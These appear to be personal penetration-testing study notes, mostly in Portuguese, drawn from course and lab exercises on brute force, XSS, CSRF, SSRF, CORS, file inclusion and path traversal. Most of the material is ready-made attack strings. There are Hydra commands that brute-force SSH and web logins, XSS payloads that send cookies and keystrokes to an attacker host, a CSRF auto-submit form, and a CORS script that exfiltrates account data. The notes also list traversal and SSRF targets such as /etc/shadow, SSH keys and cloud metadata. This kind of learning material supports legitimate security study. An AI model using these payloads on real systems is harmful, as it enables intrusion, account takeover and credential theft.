! hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123 => Attempt to login as the root user (-l root) using a password list (-P /usr/share/wordlists/metasploit/unix_passwords.txt) with 6 threads (-t 6) on the given SSH server (ssh://192.168.1.123)
! hydra -V -L users.txt -p senha-qualquer "localhost" http-form-post "/bruteforce1/index.php:username=^USER^&password=^PASS^:S=Senha incorreta" 
		  [Explicando o comando acima, que tem por objetivo testar usernames e ver se o site retorna "senha incorreta", ficando subentendido que o usuáirio existe. No output do server apache com o webapp da Alura: Nas últimas 4 linhas, temos as tentativas que resultaram na mensagem "Senha incorreta", revelando que os usuários existentes no sistema.]
		  1) Caso fôssemos testar um login com um usuário específico, usaríamos a flag -l (com a letra L minúscula), por exemplo: -l bruno. Contudo, no nosso caso, vamos usar o arquivo com a lista de usuários, então utilizamos -L users.txt (com a letra L maiúscula). 
		  2) Para testar uma única senha em cada usuário, usaremos -p minúsculo e a senha a ser inserida "senha-qualquer". 
		  3) Em seguida, indicamos em qual URL o Hydra rodará: o localhost. 
		  4) Depois, determinamos o método (http-form-post) e a página ("/bruteforce1/index.php"). 
		  5) Além disso, é necessário indicar o parâmetro a ser testado, na própria URL. Primeiramente, o Hydra testará o username, inserindo o USER, conforme a lista de usuários (username=^USER^). Depois, será testada a password (password=^PASS^). 
		  6) Por fim, para sabermos se o usuário existe ou não, vamos verificar se a mensagem "Senha incorreta" foi acionada. Colocaremos o S= para indicar o caso afirmativo, seguido da mensagem que aparece na tela do site quando digitamos um usuário existente e uma senha incorreta.
		  7) Para visualizar o processo mais detalhadamente, podemos usar o modo verbose, incluindo o -V no início do comando
$ hydra -l bruno -P passwords.txt "localhost" http-form-post "/bruteforce1/index.php:username=^USER^&password=^PASS^:Senha incorreta"  => Note que em "...password=^PASS^:Senha incorreta" retiramos o "S=" isso significa que agora iremos pegar apenas o caso negativo, ou seja, caso a senha não esteja incorreta. 
```

#Cross_Site_Scripting (XSS):
     * De acordo com a OWASP, os ataques XSS Persistent são aqueles onde os scripts são armazenados permanentemente no back-end. A vítima então recebe esse script ao realizar o acesso a página.
     * ! XSS reflected => Caso for feito um XSS refletido, o script inserido é executado apenas na página do atacante. Devido a isso, caso ele queira que outro usuário acesse a página, deverá enviar sua url para que o outro acesse e veja seu script. Isso é um ataque de engenharia social conhecido como phishing.
     * ! XSS Persist => Caso for feito um XSS armazenado ou persistente, o script inserido pelo atacante ficará armazenado no servidor da aplicação, sendo assim, qualquer outro usuário que acessar a página verá o script injetado.
     * ! XSS baseada em DOM => O JavaScript do site obtém o conteúdo do parâmetro window.location.x e o grava na página, na seção visualizada no momento. O conteúdo do hash não é verificado em busca de código malicioso, permitindo que um invasor injete o JavaScript de sua escolha na página. Quando você encontrar esses trechos de código, precisará ver como eles são manipulados e se os valores são gravados no DOM da página da web ou passados ​​para métodos JavaScript inseguros, como eval().
```bash
   $ nc -lvp 80   =>  Net catch, responsável por abrir portas, ele ficará escutando as informações que trafegam nessa porta. Utilizando o Kali Linux, abrimos o terminal e nele vamos usar o net catch (nc). O nc deve escutar (-l) e mostrar (v) a porta (p) de número 80.
       $ No lab 1 de XSS da PortSwigger colocamos na barra de busca '<script>alert(1)</script>', essa informação alterou nossa url, assim, quando alguem acessar esse link novamente, a url virá com esse script que será interpretado pelo navegador.
       $ No lab 3 analisando o html vimos que a cada busca na barra de pesquisa o texto é adicionado me uma tag img ' <img src="/resources/images/tracker.gif?searchTerms=busca feita na barra de pesquisa ">'. Dessa forma, podemos colocar um código nessa tag para executarmos um ataque XSS, ' <img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)> //
"> '

& <script>alert('XSS');</script>
& <script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>
& <script>document.onkeypress = function(e) {fetch('https://hacker.com/log?key=' + btoa(e.key) );}</script>
& <script>user.changeEmail('attacker@email.com');</script>
& <sscriptcript>alert('THM');</sscriptcript>
& /images/cat.jpg" onload="alert('THM');

& nc -nlvp <port>
& </textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
```
```
& jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
#Mass_Assignment:
       * A atribuição em massa é uma vulnerabilidade do computador em que um padrão de registro ativo em um aplicativo Web é abusado para modificar itens de dados que o usuário normalmente não deve ter permissão para acessar, como senha, permissões concedidas ou status de administrador. (O ataque de Mass Assignment explora a questão dos frameworks MVC permitirem que associemos valores dos formulários diretamente com nossas classes de modelo. Com isso, o usuário pode vir através da manipulação do formulário HTML alterar os atributos presentes nessa classe modelo.)
 	  ! Github já sofreu com esse ataque, ver: https://gist.github.com/peternixey/1978249    e   https://www.alura.com.br/artigos/seguranca-de-sua-aplicacao-e-os-frameworks-ataque-ao-github
       ! Para proteger contra o ataque de Mass assignment nós criamos uma classe chamada UsuarioDTO que poderia ser utilizada em qualquer framework. Uma alternativa ao DTO é o método setAllowedFields, em que somente os atributos listados é que poderão ser manipulados pelo usuário. Com isso, mesmo que o usuário tente manipular o atributo roles pelo formulário HTML, isso não será refletido para o atributo da nossa classe e um usuário só será cadastrado com o perfil ROLE_USER. (O método setAllowedFields permite que nós especifiquemos quais são os atributos da classe que o usuário terá permissão de manipular. No caso da Alura Shows, temos a classe modelo Usuario com o atributo roles que não deve ser manipulado e com isso não o especificamos dentro desse método.)
#Backdoor:
     * Um backdoor seria um arquivo no qual é usado para conexão, permitindo assim quando usado de forma correta, que um administrador possa entrar no sistema para realizar reparos de problemas. Quando usado de forma incorreta, o backdoor torna-se uma forma que hackers utilizam para ganhar acesso de forma ilícita.
       !Uploads de arquivos podem se tornar um problema, vimos em nossa aplicação pelo fato do sistema não verificar o tipo de arquivo, fomos capazes de inserir um backdoor e ganhamos assim acesso ao sistema. Ao filtrar o tipo de arquivo, temos uma segurança maior que o que será passado é apenas o necessário para nossa aplicação, por exemplo, poderíamos colocar em Java:  
```
$ FileFilter filtro = new FileNameExtensionFilter("jpg", "jpeg");
```
#Credential_Spoofing:
      Credential stuffing is a type of cyberattack in which the attacker collects stolen account credentials, typically consisting of lists of usernames and/or email addresses and the corresponding passwords (often from a data breach), and then uses the credentials to gain unauthorized access to user accounts through large-scale automated login requests directed against a web application.
#Path_Traversal:
      * Um ataque de passagem de diretório explora validação de segurança insuficiente ou sanitização de nomes de arquivos fornecidos pelo usuário, de forma que os caracteres que representam "passagem para o diretório pai" são passados ​​para a API do sistema de arquivos do sistema operacional.
      ! https://192.168.189.128/mutillidae/index.php?page=../etc/passwd

| **Location**                  | **Description**                                                                                                                                                   |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `/etc/issue`                  | contains a message or system identification to be printed before the login prompt.                                                                                |
| `/etc/profile`                | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
| `/proc/version`               | specifies the version of the Linux kernel                                                                                                                         |
| `etc/passwd`                  | has all registered users that have access to a system                                                                                                             |
| `/etc/shadow`                 | contains information about the system's users' passwords                                                                                                          |
| `/root/.bash_history`         | contains the history commands for `root` user                                                                                                                     |
| `/var/log/dmessage`           | contains global system messages, including the messages that are logged during system startup                                                                     |
| `/var/mail/root`              | all emails for `root` user                                                                                                                                        |
| `/root/.ssh/id_rsa`           | Private SSH keys for a root or any known valid user on the server                                                                                                 |
| `/var/log/apache2/access.log` | the accessed requests for `Apache` web server                                                                                                                     |
| `C:\boot.ini`                 | contains the boot options for computers with BIOS firmware                                                                                                        |

#Remote_File_Inclusion (RFI):
      * Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts. The perpetrator’s goal is to exploit the referencing function in an application to upload malware (e.g., backdoor shells) from a remote URL located within a different domain.
      * Remote File Inclusion (RFI), que geralmente ocorre quando a aplicação, por meio de algum parâmetro, incorpora em algum arquivo um código que está presente dentro de outro servidor.
      ! https://192.168.189.128/mutillidae/index.php?page=https://www.google.com 
#Local_File_Inclusion (LFI):
      * Local File Inclusion is an attack technique in which attackers trick a web application into either running or exposing files on a web server. LFI attacks can expose sensitive information, and in severe cases, they can lead to cross-site scripting (XSS) and remote code execution.
#Cross-Site_Request_Forgery:
      * Resumidamente, nesse cenário, assumimos o papel de usuário 1, quem faz a manipulação do site e envia a URL suspeita por e-mail ao usuário 2. O usuário 2 acessa o endereço e sua senha é alterada sem que ele saiba, caracterizando um cross-site request forgery (CSRF).  
      ! https://192.168.100.167/dvwa/vulnerabilities/csrf/?password_current=123456&password_new=123&password_conf=123&Change=Change# => Essa URL pode ser enviada para um encurtador de URL 
      * Ele consiste em uma série de caracteres aleatórios, gerados a cada formulário a ser preenchido pelo usuário que é enviado pelo servidor. Após o recebimento pelo usuário, o token é checado novamente. O servidor só aceita o POST caso o CSRF Token se provar igual ao enviado inicialmente. Diferentemente do session token e dos cookies, o CSRF Token não pode ser utilizado por um hacker mal intencionado.
#Cross-site_request_forgery:  
      * O cross-site request forgery, em português falsificação de solicitação entre sites, também conhecido como ataque de um clique ou montagem de sessão, é um tipo de exploit malicioso de um website, no qual comandos não autorizados são transmitidos a partir de um usuário em quem a aplicação web confia.
      * Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.
      https://security.love/CSRF-PoC-Genorator/ => colete essas informações no proxy do Burp Suite, você irá criar um arquivo eu deverá cadastrar um usuário de sua escolha (por exemplo) usando o header http
      ! No lab 1 de CSRF usamos o script: <html> <body> <form enctype="application/x-www-form-urlencoded" action="https://0a0600c3030c116bc0fe0af000d800af.web-security-academy.net/my-account" method="POST"> <input type="hidden" name="email" value="pwned@evil-user.net" /> </form> <script> document.forms[0].submit();</script></body> </html>

#Server-side_request_forgery:
      * SSRF stands for Server-Side Request Forgery. It's a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.
      ! https://website.com/stock?url=https://api.website.com/api/stock/item?id=123
      ! https://api.website.com/api/stock/../user
      ! https://website.com/item/2?server=server.website.com/flag?id=9&x= (&x= to ignore the rest of the URL)
      ! https://domain/index.php?page=https://localhost/ => aqui pela URL conseguimos retornar o localhost do servidor a partir da minha máquina, confirando assim um SSRF
      ! http://localhost/admin/delete?username=carlos
      ! Tendo como exemplo o provedor de nuvem AWS, é bastante comum de se ver aplicações hospedadas em um Amazon Elastic Compute Cloud (Amazon EC2) e, com isso, atacantes acabam obtendo um meio de acessar credenciais de metadados de máquinas EC2 por meio do SSRF.
        No exemplo descrito na página Hacking The Cloud, é possível ver que a maioria das instâncias do EC2 possuem acesso ao serviço de metadados que contém informações, como endereço IP da instância, credenciais das IAM roles e o nome do security group e, esse acesso é feito por meio do endereço de IP 169.254.169.254.
        https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/
#CORS (Cross-origin resource sharing):
      * O CORS é uma política do HTTP de controle de compartilhamento de recursos entre sites, decidindo que origens serão aceitas ou rejeitadas. Resumidamente, temos o lado do cliente (por exemplo, o domínio do Github) que fará uma requisição para uma API (por exemplo, uma API do GitHub). Quando o compartilhamento de recursos é autorizado, costumamos ver no header "Access-Control-Allow-Origin:" seguido do domínio autorizado. Assim, a API determina que a origem é segura e a resposta é enviada com os recursos compartilhados. 
      ! Podemos executar um ataque do tipo CORS criando um exploit, ou script, que use CORS para obter algum dado do usuário que acessá-lo. Sendo tudo isso por meio de uma Engenharia Social, onde o(a) atacante pode elaborar um email ou outra artimanha que induzirá algum alvo acessar o exploit.

Lab 1 de CORS da PortSwigger:

Com isso, simulamos a construção de um script, ou exploit, que assim que o usuário acessar, por meio dos logs conseguimos ver sua API key por estar aberta a compartilhamento entre sites pela configuração falha do CORS.

```
<html>
<body>
<script>
   var xhrequest = new XMLHttpRequest();
   // Preencha com a URL do seu laboratorio aqui:
   var url = "https://0abe00ef04a17ad3c0102ceb00270080.web-security-academy.net"

   xhrequest.open('GET', url + "/accountDetails", true);
   xhrequest.withCredentials = true;
   xhrequest.send(null)

   xhrequest.onreadystatechange = function() {
       if (xhrequest.readyState == XMLHttpRequest.DONE){
           fetch("/log?key=" + xhrequest.responseText)
       }
   }
</script>
</body>
</html>
```
<html>
<body>
<script>
   var xhrequest = new XMLHttpRequest();
   // Preencha com a URL do seu laboratorio aqui:
   var url = "https://0abe00ef04a17ad3c0102ceb00270080.web-security-academy.net"

   xhrequest.open('GET', url + "/accountDetails", true);
   xhrequest.withCredentials = true;
   xhrequest.send(null)

   xhrequest.onreadystatechange = function() {
       if (xhrequest.readyState == XMLHttpRequest.DONE){
           fetch("/log?key=" + xhrequest.responseText)
       }
   }
</script>
</body>
</html>

## Kali-Linux 
https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md#kali-linux
```
$ macof -i eth0     => O comando macof, se refere a overflow de endereços mac. É preciso informar em que interface ( -i) esse ataque será realizado. No nosso caso, temos a eth0, a placa de rede que está conectada ao switch no programa de emulação. Ao dar enter, ele começará a mandar uma infinidade de endereços para o switch, a fim de lotar a memória e fazer com que ele trabalhe como um switch, podendo assim pegarmos informações de pacotes com o wireshark
$ arp -a            => Ver quais endereços MAC estão salvos para serem usados pelo ARP
$ `netstat -lntp`       => Show active internet connections
$ netstat -antp |grep apache                    => Verify a service is running and listening
$ md5sum <file>     => Verifica a integridade um arquivo transferido pela rede (ex: via Netcat TCP/UDP), gera um códido hash, se esse código hash no remetente e no destinatário forem iguais, então a transferência deu certo
$ netdiscover -i eth0
```

[[Anonimato na rede]]

PIM => Gerenciamento dos papéis/responsividades/permissões dos usuários
PAM => Gerenciamento das permissões e privilégios do acesso ao sistema

